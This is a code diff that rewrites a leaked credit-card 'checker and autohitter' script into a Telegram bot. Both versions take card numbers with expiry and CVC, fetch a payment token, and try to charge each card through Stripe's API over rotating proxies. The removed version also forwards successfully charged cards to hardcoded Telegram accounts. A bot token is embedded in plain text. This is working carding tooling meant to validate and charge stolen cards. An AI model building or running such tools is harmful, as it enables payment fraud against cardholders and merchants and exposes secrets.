@@ -1,116 +1,29 @@
-import os
-import sys
-import time
+from telegram import InlineKeyboardMarkup, InlineKeyboardButton, Update
+from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
 import requests
 import random
-import telebot
 
-# ANSI color codes
-RED = "\033[91m"
-GREEN = "\033[92m"
-YELLOW = "\033[93m"
-BLUE = "\033[94m"
-RESET = "\033[0m"
-
-# Global variables
+# Global Variables
+bot_token = '7801446284:AAEVqjQPWl6a0NXXCAGdfl6Mw-Fg0PXmB8U'
+owner_id = 6663845789
+user_ids = []  # List to store multiple user IDs
 use_proxy = False
 proxies = []
-bot_token = '7801446284:AAEVqjQPWl6a0NXXCAGdfl6Mw-Fg0PXmB8U'
-user_ids = [6663845789,6698364560]
 
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def check_website():
-    url = "https://bloodxteam.com/f.php"
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            content = response.text.strip()
-            if content.lower() == 'yes':
-                return True
-            else:
-                print(f"Warning: {content}")
-                return False
-        else:
-            print(f"Failed to access the API. Status code: {response.status_code}")
-            return False
-    except Exception as e:
-        print(f"Error accessing the API: {str(e)}")
-        return False
-
-def loading_animation():
-    animation = ["\xe2\x96\x96", "\xe2\x96\x98", "\xe2\x96\x9d", "\xe2\x96\x97"]
-    for _ in range(3):  # 3 seconds, 4 frames per second
-        for frame in animation:
-            sys.stdout.write(f"\rLoading {frame}")
-            sys.stdout.flush()
-            time.sleep(0.2)
-    print("\nLoading complete!")
-
-def print_ascii_art():
-    ascii_art = f"""{YELLOW}
-LEAKED BY PROPAGANDA
-                                           
-- - - - - - - - - - - - - - - - 
- Gear Name - PPG heroku - X 
- - - -ERROR! 
- - - - - - - - - - - - 
- Type - Cc checker + Autohitter                
- Developer A Gay
- Sk Health Of Heroku.com : INFINITY AND HQ 
- Channel : t.me/teampropaganda
-{RESET}"""
-    print(ascii_art)
-
-def print_menu():
-    print(f"{GREEN}[+] Start Card CHK Herokux [1]{RESET}")
-    print(f"{GREEN}[+] Toggle Proxy [2]{RESET}")
-    print(f"{GREEN}[+] Add Telegram User ID [3]{RESET}")
-    print(f"\n{GREEN}Please select any option: {RESET}", end="")
-
+# Helper function to toggle proxy
 def toggle_proxy():
     global use_proxy, proxies
-    if not use_proxy:
-        file_name = input("Enter the proxy file name: ")
-        try:
-            with open(file_name, 'r') as file:
-                proxies = [line.strip() for line in file if line.strip()]
-            use_proxy = True
-            print("I will use proxy now!")
-        except FileNotFoundError:
-            print(f"File '{file_name}' not found in the current directory.")
-    else:
+    if use_proxy:
         use_proxy = False
         proxies = []
-        print("I will not use proxy!")
-    time.sleep(2)
-
-def add_telegram_user_id():
-    global user_ids
-    user_id = input("Please enter your Telegram User ID: ")
-    if user_id not in user_ids:
-        user_ids.append(user_id)
-        print(f"User ID {user_id} added successfully!")
+        return "Proxy disabled."
     else:
-        print(f"User ID {user_id} is already in the list.")
-    time.sleep(2)
+        # You can implement proxy file input through the bot here if needed
+        proxies = ["your_proxies_here"]
+        use_proxy = True
+        return "Proxy enabled."
 
-def send_to_telegram(message):
-    if bot_token and user_ids:
-        bot = telebot.TeleBot(bot_token)
-        for user_id in user_ids:
-            try:
-                bot.send_message(user_id, message)
-            except Exception as e:
-                print(f"Failed to send message to {user_id}: {str(e)}")
-
-import warnings
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
-# Suppress only the InsecureRequestWarning from urllib3
-warnings.simplefilter('ignore', InsecureRequestWarning)
-
+# Helper function to parse proxy
 def parse_proxy(proxy):
     parts = proxy.split(':')
     if len(parts) == 4:
@@ -120,9 +33,9 @@ def parse_proxy(proxy):
             'https': f'http://{username}:{password}@{domain}:{port}'
         }
     else:
-        print(f"Invalid proxy format: {proxy}")
         return None
 
+# Check card function
 def check_card(card_details, heroku_auth_key):
     try:
         cc, month, year, cvc = card_details.split('|')
@@ -140,11 +53,10 @@ def check_card(card_details, heroku_auth_key):
         token = heroku_token_data.get('token')
 
         if not token:
-            return f"{RED}Failed to retrieve Heroku token{RESET}"
+            return "Failed to retrieve Heroku token"
 
         token_first_part = token.split('_secret_')[0]
 
-        # Prepare data for Stripe API
         post_data = {
             'type': 'card',
             'billing_details[name]': 'Julie Herrera',
@@ -175,8 +87,6 @@ def check_card(card_details, heroku_auth_key):
             if use_proxy and proxies:
                 proxy = random.choice(proxies)
                 proxy_dict = parse_proxy(proxy)
-                if proxy_dict:
-                    print(f"Using proxy: {proxy}")
 
             second_response = requests.post(
                 f'https://api.stripe.com/v1/payment_intents/{token_first_part}/confirm',
@@ -187,60 +97,90 @@ def check_card(card_details, heroku_auth_key):
             response_body = second_response.json()
 
             if response_code == 402:
-                error_message = response_body.get('error', {}).get('message', 'Unknown error')
-                return f"{RED}Error: {error_message}{RESET}"
+                return f"Error: {response_body.get('error', {}).get('message', 'Unknown error')}"
             elif response_code == 200 and response_body.get('status') == 'succeeded':
-                send_to_telegram(f"{card_details} - Charged successfully!")
-                return f"{YELLOW}Charged successfully!{RESET}"
+                return "Charged successfully!"
             else:
-                return f"{RED}Failed with status: {response_code}{RESET}"
+                return f"Failed with status: {response_code}"
         else:
-            return f"{RED}Failed to retrieve payment method ID{RESET}"
-
-    except requests.exceptions.ProxyError as e:
-        return f"{RED}Proxy error: {str(e)}{RESET}"
-    except requests.exceptions.RequestException as e:
-        return f"{RED}Request failed: {str(e)}{RESET}"
+            return "Failed to retrieve payment method ID"
     except Exception as e:
-        return f"{RED}Card check failed: {str(e)}{RESET}"
+        return f"Card check failed: {str(e)}"
 
-def start_card_check():
-    heroku_auth_key = input("Please enter your Heroku auth token: ")
-    file_name = input("Please enter your txt file name which contains cards: ")
-    try:
-        with open(file_name, 'r') as file:
-            cards = file.readlines()
+# Start command handler
+def start(update: Update, context: CallbackContext):
+    keyboard = [
+        [
+            InlineKeyboardButton("Proxy Toggle", callback_data='toggle_proxy'),
+            InlineKeyboardButton("Add User", callback_data='add_user')
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    update.message.reply_text('CC Checker Bot by Alcyone for Heroku and Stripe', reply_markup=reply_markup)
 
-        for card in cards:
-            card = card.strip()
-            response = check_card(card, heroku_auth_key)
-            print(f"{card} {response}")
-    except FileNotFoundError:
-        print(f"File '{file_name}' not found in the current directory.")
+# Callback query handler
+def button(update: Update, context: CallbackContext):
+    query = update.callback_query
+    query.answer()
+
+    if query.data == 'toggle_proxy':
+        result = toggle_proxy()
+        query.edit_message_text(text=result)
+
+    elif query.data == 'add_user':
+        if str(query.from_user.id) == str(owner_id):
+            context.bot.send_message(chat_id=query.message.chat_id, text="Please provide the user ID to add.")
+            context.user_data['awaiting_user_id'] = True
+        else:
+            context.bot.send_message(chat_id=query.message.chat_id, text="You are not authorized to add users.")
+
+# Add user handler (Owner only)
+def process_add_user(update: Update, context: CallbackContext):
+    if context.user_data.get('awaiting_user_id'):
+        user_id = update.message.text
+        if user_id not in user_ids:
+            user_ids.append(user_id)
+            update.message.reply_text(f"User ID {user_id} added successfully!")
+        else:
+            update.message.reply_text(f"User ID {user_id} is already in the list.")
+        context.user_data['awaiting_user_id'] = False
+
+# Command to check card
+def check_card_command(update: Update, context: CallbackContext):
+    update.message.reply_text("Please send card details in format: CC|MM|YY|CVC")
+    context.user_data['awaiting_card_details'] = True
+
+def process_card_details(update: Update, context: CallbackContext):
+    if context.user_data.get('awaiting_card_details'):
+        card_details = update.message.text
+        context.user_data['card_details'] = card_details
+        update.message.reply_text("Please provide your Heroku auth token.")
+        context.user_data['awaiting_card_details'] = False
+        context.user_data['awaiting_heroku_token'] = True
+
+def process_heroku_token(update: Update, context: CallbackContext):
+    if context.user_data.get('awaiting_heroku_token'):
+        heroku_auth_key = update.message.text
+        card_details = context.user_data.get('card_details')
+        response = check_card(card_details, heroku_auth_key)
+        update.message.reply_text(response)
+        context.user_data['awaiting_heroku_token'] = False
 
 def main():
-    if check_website():
-        loading_animation()
-        while True:
-            clear_screen()
-            print_ascii_art()
-            print_menu()
+    updater = Updater(bot_token, use_context=True)
 
-            choice = input()
+    dp = updater.dispatcher
 
-            if choice == '1':
-                start_card_check()
-            elif choice == '2':
-                toggle_proxy()
-            elif choice == '3':
-                add_telegram_user_id()
-            else:
-                print("Invalid option. Please try again.")
+    dp.add_handler(CommandHandler('start', start))
+    dp.add_handler(CallbackQueryHandler(button))
+    dp.add_handler(MessageHandler(Filters.text & Filters.regex(r'^\d{16}\|\d{2}\|\d{2}\|\d{3}$'), process_card_details))
+    dp.add_handler(MessageHandler(Filters.text & Filters.regex(r'^sk_live.*$'), process_heroku_token))
+    dp.add_handler(MessageHandler(Filters.text, process_add_user))  # Handle adding user and token check
+    
+    dp.add_handler(CommandHandler('check', check_card_command))
 
-            input("Press Enter to continue...")
-    else:
-        print("Exiting the program.")
-        sys.exit()
+    updater.start_polling()
+    updater.idle()
 
 if __name__ == '__main__':
     main()
